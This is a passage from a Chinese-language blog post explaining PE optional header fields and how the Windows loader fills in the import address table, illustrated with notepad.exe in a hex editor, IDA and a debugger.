<td align="left">Windows 8</td>
<td align="left">6.2</td>
</tr>
<tr>
<td align="left">Windows Server 2012</td>
<td align="left">6.2</td>
</tr>
<tr>
<td align="left">Windows 7</td>
<td align="left">6.1</td>
</tr>
<tr>
<td align="left">Windows Server 2008 R2</td>
<td align="left">6.1</td>
</tr>
<tr>
<td align="left">Windows Server 2008</td>
<td align="left">6.0</td>
</tr>
<tr>
<td align="left">Windows Vista</td>
<td align="left">6.0</td>
</tr>
<tr>
<td align="left">Windows Server 2003 R2</td>
<td align="left">5.2</td>
</tr>
<tr>
<td align="left">Windows Server 2003</td>
<td align="left">5.2</td>
</tr>
<tr>
<td align="left">Windows XP 64-Bit Edition</td>
<td align="left">5.2</td>
</tr>
<tr>
<td align="left">Windows XP</td>
<td align="left">5.1</td>
</tr>
<tr>
<td align="left">Windows 2000</td>
<td align="left">5.0</td>
</tr>
<tr>
<td align="left">Windows 98 &#x2F; Windows Me</td>
<td align="left">4.0</td>
</tr>
<tr>
<td align="left">Windows 95</td>
<td align="left">4.0</td>
</tr>
</tbody></table>
<p>也就是说是最早可以运行notepad.exe的windows系统就是win 2000,</p>
<p>只要版本号比5高的系统都可以运行notepad.exe</p>
<h5 id="Major-MinorImageVersion"><a href="#Major-MinorImageVersion" class="headerlink" title="Major&#x2F;MinorImageVersion"></a>Major&#x2F;MinorImageVersion</h5><p>主要&#x2F;次要映像版本</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193728974.png" alt="image-20220711193728974"></p>
<p>也可以在CMD上用<code>dism /online /get-targeteditions</code>命令查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">86135</span>&gt;dism /online /get-targeteditions</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: <span class="number">10.0</span><span class="number">.22621</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">映像版本: <span class="number">10.0</span><span class="number">.22621</span><span class="number">.105</span></span><br></pre></td></tr></table></figure>

<p>这个东西是干啥的,没有搜到</p>
<h5 id="Major-MinorSubsystemVersion"><a href="#Major-MinorSubsystemVersion" class="headerlink" title="Major&#x2F;MinorSubsystemVersion"></a>Major&#x2F;MinorSubsystemVersion</h5><p>主要&#x2F;次要子系统版本</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193741398.png" alt="image-20220711193741398"></p>
<h5 id="Win32VersionValue"><a href="#Win32VersionValue" class="headerlink" title="Win32VersionValue"></a>Win32VersionValue</h5><p>预留值,必须为0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193752606.png" alt="image-20220711193752606"></p>
<h5 id="SizeOfImage"><a href="#SizeOfImage" class="headerlink" title="SizeOfImage"></a>SizeOfImage</h5><p>映像大小,即本文件完全装载进入虚拟内存中占用的空间</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193823319.png" alt="image-20220711193823319"></p>
<p>该值必须是节对齐要求的整数倍</p>
<h5 id="SizeOfHeaders"><a href="#SizeOfHeaders" class="headerlink" title="SizeOfHeaders"></a>SizeOfHeaders</h5><p>包括DOS头,Nt头,节头表三个的总大小,然后向上舍入到一个FileAlignment的倍数值</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193840091.png" alt="image-20220711193840091"></p>
<h5 id="CheckSum"><a href="#CheckSum" class="headerlink" title="CheckSum"></a>CheckSum</h5><p>检校和</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193848414.png" alt="image-20220711193848414"></p>
<p>从程序最开始,以两个字节为单位不断相加,忽略溢出,最后加上文件长度得到校验和</p>
<p>在加载任何驱动程序,启动时任何动态库,任何系统进程加载动态库时</p>
<p>都需要经过检校</p>
<h5 id="SubSystem"><a href="#SubSystem" class="headerlink" title="SubSystem"></a>SubSystem</h5><p>这是一个枚举值,每个值对应一个序号,表示运行本镜像需要的子系统</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_UNKNOWN 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_GUI 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CUI 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_OS2_CUI 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_POSIX_CUI 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE_WINDOWS 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_APPLICATION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_ROM 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16</span></span><br></pre></td></tr></table></figure>

<p>比如2号就是windows用户图形界面接口子系统,就是窗口程序</p>
<p>比如3号就是windows字符模式用户接口子系统,就是控制台程序</p>
<p>notepad.exe当然需要GUI界面,因此该值为2</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193921306.png" alt="image-20220711193921306"></p>
<blockquote>
<p>自己写的控制台程序helloworld.exe,这个值就是CUI</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711194026471.png" alt="image-20220711194026471"></p>
</blockquote>
<p>如果使用010editor将notepad.exe的SubSystem值给他改一下,改成CUI,会发生啥呢?</p>
<p>会同时运行一个控制台和一个窗口程序</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711194252567.png" alt="image-20220711194252567"></p>
<p>在控制台上使用ctrl+C中断进程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[已退出进程，代码为 3221225786 (0xc000013a)]</span><br></pre></td></tr></table></figure>

<p>窗口也会跟着关闭</p>
<p>同理点选窗口右上角的❌,控制台也会关闭</p>
<p>将SubSystem值再改为其他值都会报错无法在win32环境运行</p>
<h5 id="DllCharacteristics"><a href="#DllCharacteristics" class="headerlink" title="DllCharacteristics"></a>DllCharacteristics</h5><p>枚举值,描述本映像加载动态库的属性</p>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th align="left">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0x0001</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x0002</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x0004</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x0008</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLL_CHARACTERISTICS_HIGH_ENTROPY_VA</strong>0x0020</td>
<td align="left">ASLR with 64 bit address space.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong>0x0040</td>
<td align="left">The DLL can be relocated at load time.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY</strong>0x0080</td>
<td align="left">Code integrity checks are forced. If you set this flag and a section contains only uninitialized data, set the <strong>PointerToRawData</strong> member of <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-image_section_header">IMAGE_SECTION_HEADER</a> for that section to zero; otherwise, the image will fail to load because the digital signature cannot be verified.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_NX_COMPAT</strong>0x0100</td>
<td align="left">The image is compatible with data execution prevention (DEP).</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_NO_ISOLATION</strong>0x0200</td>
<td align="left">The image is isolation aware, but should not be isolated.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_NO_SEH</strong>0x0400</td>
<td align="left">The image does not use structured exception handling (SEH). No handlers can be called in this image.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_NO_BIND</strong>0x0800</td>
<td align="left">Do not bind the image.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLL_CHARACTERISTICS_APPCONTAINER</strong>0x1000</td>
<td align="left">Image should execute in an AppContainer.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_WDM_DRIVER</strong>0x2000</td>
<td align="left">A WDM driver.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLL_CHARACTERISTICS_GUARD_CF</strong>0x4000</td>
<td align="left">Image supports Control Flow Guard.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE</strong>0x8000</td>
<td align="left">The image is terminal server aware.</td>
</tr>
</tbody></table>
<p>比如0x0020表示ASLR,地址随机化</p>
<p>比如0x0040表示动态库可以在装载时重定位</p>
<p>0x0080,强迫进行代码完整性检查,作用是防止恶意代码注入等等安全问题</p>
<p>0x0100,NX保护,数据段不可执行</p>
<p>…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711195943323.png" alt="image-20220711195943323"></p>
<p>notepad.exe上这个值为0x8000(小端)</p>
<h5 id="SizeOfStackReserve"><a href="#SizeOfStackReserve" class="headerlink" title="SizeOfStackReserve"></a>SizeOfStackReserve</h5><p>栈区预留空间大小,notepad.exe上栈区的预留了大小是40000h,即256K</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711200402067.png" alt="image-20220711200402067"></p>
<p>该值就是栈区的最大大小,要是本地变量太多或者函数递归太深太多,则发生栈溢出,</p>
<blockquote>
<p>这里可以自己写一个程序实验一下,</p>
<p><code>524288=2^19=2^9K=80000h&lt;800000=2e5</code></p>
<p>那么我们在代码中开一个2e5的int数组,超过了524288字节,看看能否开出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">200000</span>];<span class="comment">//2e5数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">200000</span>;++i)&#123;</span><br><span class="line">        arr[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714232816684.png" alt="image-20220714232816684"></p>
<p>可以看到,本来预留的 栈空间是200000h&#x3D;2M是可以放下2e5的数组的,全换算成int是0.5M个,即512K</p>
<p>此时程序正常运行</p>
<p>现在给他穿个小鞋</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711202828849.png" alt="image-20220711202828849"></p>
<p>果然寄了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711202847174.png" alt="image-20220711202847174"></p>
<p>而这个返回代码0xc00000fd正是栈溢出的状态</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/caichengji1/article/details/53885081"> Windows 异常代码查询</a></p>
</blockquote>
<h5 id="SizeOfStackCommit"><a href="#SizeOfStackCommit" class="headerlink" title="SizeOfStackCommit"></a>SizeOfStackCommit</h5><p>栈提交大小,notepad.exe上栈提交大小是11000h即68K</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711200716003.png" alt="image-20220711200716003"></p>
<p>啥是”提交大小”?</p>
<p>中文站点下没找到,在stackoverflow上找到了解答</p>
<p>[c++ - What is the Difference between reserve and commit argument to CreateThread? - Stack Overflow](<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/24260638/what-is-the-difference-between-reserve-and-commit-argument-to-createthread#:~:text=The">https://stackoverflow.com/questions/24260638/what-is-the-difference-between-reserve-and-commit-argument-to-createthread#:~:text=The</a> reserve argument sets the amount of address,be initially committed to the stack’s reserved region.)</p>
<blockquote>
<p>The <em>commit</em> is the size of physical memory that the system should preallocate for the stack</p>
</blockquote>
<p>commit就是为栈区预留的物理内存大小</p>
<blockquote>
<p>SizeOfStackReserve是栈区最大占用的虚拟内存空间的大小</p>
<p>SizeOfStackCommit是栈区对应虚拟内存实际使用的物理内存大小</p>
</blockquote>
<h5 id="SizeOfHeapReserve"><a href="#SizeOfHeapReserve" class="headerlink" title="SizeOfHeapReserve"></a>SizeOfHeapReserve</h5><p>堆区预留空间大小,类似于SizeOfStackReserve</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711201710792.png" alt="image-20220711201710792"></p>
<h5 id="SizeOfHeapCommit"><a href="#SizeOfHeapCommit" class="headerlink" title="SizeOfHeapCommit"></a>SizeOfHeapCommit</h5><p>堆区实际使用物理地址空间大小</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711201719842.png" alt="image-20220711201719842"></p>
<h5 id="LoaderFlags"><a href="#LoaderFlags" class="headerlink" title="LoaderFlags"></a>LoaderFlags</h5><p>已经被官方扬了</p>
<h5 id="NumberOfRvaAndSizes"><a href="#NumberOfRvaAndSizes" class="headerlink" title="NumberOfRvaAndSizes"></a>NumberOfRvaAndSizes</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711204300399.png" alt="image-20220711204300399"></p>
<p>微软也是春秋笔法,这个值的解释就短短一行</p>
<blockquote>
<p>The number of directory entries in the remainder of the optional header. Each entry describes a location and size.</p>
<p>可选头中剩下的部分中,目录条目的个数.</p>
<p>每个条目描述了一个位置和大小</p>
</blockquote>
<p>你说你🐎呢,这说了个什么事啊?</p>
<p>这需要联系可选头剩余的部分一起看,确实剩下的部分有16个条目</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711204911890.png" alt="image-20220711204911890"></p>
<p>这16个条目顺序是固定的,</p>
<p>如果NumberOfRvaAndSizes&#x3D;1则只有导出表条目</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711210809700.png" alt="image-20220711210809700"></p>
<p>如果NumberOfRvaAndSizes&#x3D;2则有导出表和导入表两个条目</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711210848527.png" alt="image-20220711210848527"></p>
<p>…</p>
<p>以此类推</p>
<p>每个条目对应的表是干啥的呢?</p>
<h5 id="DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES"><a href="#DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES" class="headerlink" title="DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]"></a>DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</h5><p>其中数组大小<code>#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</code>这个值恒为16不变,</p>
<p>意思是,虽然<code>DataDirectory</code>一直就是16项,但是实际多少项有效,这需要上一个成员<code>NumberOfRvaAndSizes</code>来决定</p>
<p>现在的问题是,<strong><code>DataDirectory</code>数组的元素是什么呢?</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712111448720.png" alt="image-20220712111448720"></p>
<p>每个数组元素的结构相同</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711205101433.png" alt="image-20220711205101433"></p>
<blockquote>
<p>DataDirectory数组中的每项都对应一个重要的技术,包括导入表,导出表,重定位等等</p>
</blockquote>
<p>每一个都有一个VirtualAddress,指向一个相对虚拟地址,还有一个size成员,表征一个大小</p>
<p>指向的谁,表征的又是谁的大小呢?</p>
<h6 id="DataDirectory-1-Import"><a href="#DataDirectory-1-Import" class="headerlink" title="DataDirectory[1]&#x3D;Import"></a>DataDirectory[1]&#x3D;Import</h6><p>以其中的导入表Import为例,其VIrtualAddress指向相对虚拟地址6D20h,010editor已经帮我们计算出了文件偏移为0x6120</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712111646633.png" alt="image-20220712111646633"></p>
<p>下面用010editor观察00x6120这个位置</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112009554.png" alt="image-20220712112009554"></p>
<p><strong>发现这是一个名为ImportDescriptor[]的数组的位置</strong></p>
<p>该位置在节区之后,显然已经出了PE头了</p>
<p>这个数组一共有9项,下标0到8,每项大小相同都是14h&#x3D;20d,这样算下来这个数组大小是20*9&#x3D;180字节</p>
<blockquote>
<p>然而刚才DataDirectory的Import项中,Size&#x3D;200.这表明ImportDescriptor[]应该有10项.</p>
<p>回到010editor观察ImportDescriptor[8]之后的编码</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112522955.png" alt="image-20220712112522955"></p>
<p>发现ImportDescriptor[8]后面还有20个自己都是0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112658025.png" alt="image-20220712112658025"></p>
<p>也就是说ImportDescriptor[9]全空</p>
</blockquote>
<p><strong>现在的问题是,ImportDescriptor[]数组是干啥的呢?</strong></p>
<blockquote>
<h6 id="DataDirectory-1-VirtualAddress-ImportDescriptor"><a href="#DataDirectory-1-VirtualAddress-ImportDescriptor" class="headerlink" title="DataDirectory[1].VirtualAddress-&gt;&amp;ImportDescriptor[]"></a>DataDirectory[1].VirtualAddress-&gt;&amp;ImportDescriptor[]</h6><p><strong>DataDirectory[1]是数据目录 的 第二项,或者说导入目录表项</strong></p>
<p><strong>DataDirectory[1].VirtualAddress指向ImportDescriptor导入描述符表的基址</strong></p>
<blockquote>
<p>_IMAGE_IMPORT_DESCRIPTOR结构体数组ImportDescriptor[],也可以叫做IMPORT Directory Table</p>
<p>各种叫法还有指针瞎j8值的关系,一定要分清</p>
</blockquote>
<p>ImportDescriptor[]在节区之后,不属于PE头.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/PE.jpg" alt="PE"></p>
<blockquote>
<p>权威指南:</p>
<p>IMAGE_IMPORT_DESCRIPTOR结构体ImportDescriptor[],</p>
<p>其中记录着PE文件要导入哪些库文件,程序需要多少导入个库,就需要有多少个ImportDescriptor项目,这些项目组成数组,数组最后一项全空</p>
<p>这和我们刚才观察到的是相吻合的</p>
</blockquote>
<p>IID是给PE装载器用的,先贴上PE装载器的干活步骤</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712121817219.png" alt="image-20220712121817219"></p>
<blockquote>
<p>其中IID是<code>_IMAGE_IMPORT_DESCRIPTOR</code>的缩写</p>
<p>INT是<code>import name table</code>导入名称表的缩写,也就是IID中OriginalFIrstThunk指向的地址</p>
<p>IAT是import address table 导入地址表,也就是ida反汇编之后的.idata区</p>
<p>关于INT和IAT,权位指南也给了一张图,但是属于”会的一看就明白,不会的看了还是不会(出自祭祖老师顾新)”那种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712124021808.png" alt="image-20220712124021808"></p>
<p>这个图怎么看呢?</p>
<p>最左边这个是一个IID结构体,也就是ImportDescriptor[]的一项</p>
<p>其中Name&#x3D;”Kernel32.dll”,这是一个DLL库名,表明本IID的作用是导入DLL库中的函数</p>
<p>OriginalFirstThunk指向INT表基址,这个INT表实际上是<code>_IMAGE_IMPORT_BY_NAME</code>结构体数组,每一项都由一个Hint和一个字符串名组成,每个库函数都有自己的名字,比如GetCurrentThreadld,也有在库中的唯一的编号放在Hint中</p>
<p>FirstThunk指向IAT表基址,这个IAT表就是用ida观察时,.idata区中extern声明的函数.</p>
<p>对于一个库,其对应INT和IAT表中的表项应该是一样多的,意思就是需要使用几个函数就解析几个函数地址,多一个也不干</p>
<p>程序text正文代码段调用库函数时就是call idata区中的”函数”,就像<code>call    ds:DragFinish</code>.那么idata区的”函数”应当是一个地址,</p>
<p>然而动态库是在程序装载时,运行前装载的,此时已经经过了编译链接,显然即使动态库已经映射进入进程的虚拟地址空间了,但是调用库函数的地方还是不知道库函数在哪里.</p>
<p>这就好比我虽然和058班同学在同一所大学,但是我不知道sjf在哪个宿舍住,我想上门拜访一下却不知道应该去哪里</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">      WORD Hint;<span class="comment">//按照Hint编号加载函数</span></span><br><span class="line">      CHAR Name[<span class="number">1</span>];<span class="comment">//</span></span><br><span class="line">    &#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">  __C89_NAMELESS <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk;<span class="comment">//指向INT数组基地址</span></span><br><span class="line">  &#125; DUMMYUNIONNAME;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line"></span><br><span class="line">  DWORD ForwarderChain;</span><br><span class="line">  DWORD Name;<span class="comment">//动态库名称,注意不是函数名称</span></span><br><span class="line">  DWORD FirstThunk;<span class="comment">//指向IAT数组基地址</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>下面根据权威指南中给出PE装载器导入函数的步骤,跟踪观察一下</p>
<p>1.读取IID的Name成员,获取库名称</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712130001523.png" alt="image-20220712130001523"></p>
<p>以ImportDescriptor[0]为例,其Name成员指向RVA&#x3D;71A4,用ida观察0x10071A4这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:010071A4 aComdlg32Dll    db &#x27;comdlg32.dll&#x27;,0     ; DATA XREF: .text:01006D2C↑o</span><br></pre></td></tr></table></figure>

<p>确实是comdlg32.dll字符串</p>
<p>2.LoadLibrary(“comdlg32.dll”),返回值是comdlg32.dll库的句柄,该句柄将会用于库中查函数</p>
<p>3.读取IID的OriginalFiristThunk成员,获取INT表地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712130506645.png" alt="image-20220712130506645"></p>
<p>OriginalFiristThunk&#x3D;0x7088h,用ida观察0x1007088这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:01007088 ;</span><br><span class="line">.text:01007088 ; Import names for comdlg32.dll</span><br><span class="line">.text:01007088 ;</span><br><span class="line">.text:01007088 off_1007088     dd rva word_1007172     ; DATA XREF: .text:__IMPORT_DESCRIPTOR_comdlg32↑o</span><br><span class="line">.text:0100708C                 dd rva word_1007156</span><br><span class="line">.text:01007090                 dd rva word_1007196</span><br><span class="line">.text:01007094                 dd rva word_1007148</span><br><span class="line">.text:01007098                 dd rva word_1007134</span><br><span class="line">.text:0100709C                 dd rva word_1007182</span><br><span class="line">.text:010070A0                 dd rva word_1007162</span><br><span class="line">.text:010070A4                 dd rva word_100710C</span><br><span class="line">.text:010070A8                 dd rva word_100711C</span><br><span class="line">.text:010070AC                 dd 0</span><br></pre></td></tr></table></figure>

<p>ida也给出了注释”comdlg32.dll库需要导入函数的名称”,</p>
<p>需要注意的是INT表的最后一项是0,也就是NULL,它的作用是判断INT表是否结束</p>
<p>4.对于INT表的第i项,</p>
<blockquote>
<p>第0项就是<code>.text:01007088 off_1007088     dd rva word_1007172</code></p>
<p>第1项就是<code>.text:0100708C                 dd rva word_1007156</code></p>
<p>…</p>
</blockquote>
<p>根据<code>_IMAGE_IMPORT_BY_NAME</code>结构体的Name值,PE装载器调用<code>GetProcAddress(&lt;动态库句柄&gt;,&quot;&lt;函数名&gt;&quot;)</code>获取该名称对应函数的地址(此地址为在整个进程虚拟地址空间中的地址,也就是绝对虚拟地址,<strong>不是</strong>相对于动态库基址的偏移量)</p>
<p>比如其中word_1007172指向一个_IMAGE_IMPORT_BY_NAME结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:01007172 word_1007172    dw 0Fh                  ; DATA XREF: .text:off_1007088↑o</span><br><span class="line">.text:01007174                 db &#x27;PageSetupDlgW&#x27;,0</span><br></pre></td></tr></table></figure>

<p><code>Hint=0Fh</code></p>
<p><code>Name=&quot;PageSetupDlgW&quot;</code>,一个函数名</p>
<p>然后PE装载器调用<code>GetProcAddress(comdlg32.dll句柄号,&quot;PageSetupDlgW&quot;);</code>就获得了该函数的虚拟地址</p>
<p>5.根据IID的FirstThunk成员,获取对应IAT表地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712131357758.png" alt="image-20220712131357758"></p>
<p>comdlg32.dll的FirstThunk&#x3D;12A0,用ida观察0x10012A0这个地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.idata:010012A0 ; Imports from comdlg32.dll</span><br><span class="line">.idata:010012A0 ;</span><br><span class="line">.idata:010012A0 ; BOOL __stdcall PageSetupDlgW(LPPAGESETUPDLGW)</span><br><span class="line">.idata:010012A0                 extrn PageSetupDlgW:dword</span><br><span class="line">.idata:010012A0                                         ; CODE XREF: NPCommand(x,x,x)+29F↓p</span><br><span class="line">.idata:010012A0                                         ; GetPrinterDCviaDialog()+2C↓p ...</span><br><span class="line">.idata:010012A4 ; HWND __stdcall FindTextW(LPFINDREPLACEW)</span><br><span class="line">.idata:010012A4                 extrn FindTextW:dword   ; CODE XREF: NPCommand(x,x,x)+471↓p</span><br><span class="line">.idata:010012A4                                         ; DATA XREF: NPCommand(x,x,x)+471↓r</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>每项占4个字节,也就是一个int,一个指针类型,显然要写入一个函数地址</p>
<p>6.将4中获取到的PageSetupDlgW<strong>的地址</strong>写到5中的相应IAT表项中去</p>
<p>假设PageSetupDlgW的地址为0x12345678,四个字节,写到.idata区的<code>0x10012A0</code>开始的四个字节</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>数据</th>
</tr>
</thead>
<tbody><tr>
<td>0x10012A0</td>
<td>0x78</td>
</tr>
<tr>
<td>0x10012A1</td>
<td>0x56</td>
</tr>
<tr>
<td>0x10012A2</td>
<td>0x34</td>
</tr>
<tr>
<td>0x10012A3</td>
<td>0x12</td>
</tr>
</tbody></table>
<p>小端模式</p>
<blockquote>
<p>这里PageSetupDlgW的地址是我们假设的GetProcAddress的返回值,其实际值可以用ollydbg动态调试观察</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712132332297.png" alt="image-20220712132332297"></p>
<p>实际上PageSetupDlgW被装载在进程虚拟地址空间的<code>0x503D5A75</code>.</p>
</blockquote>
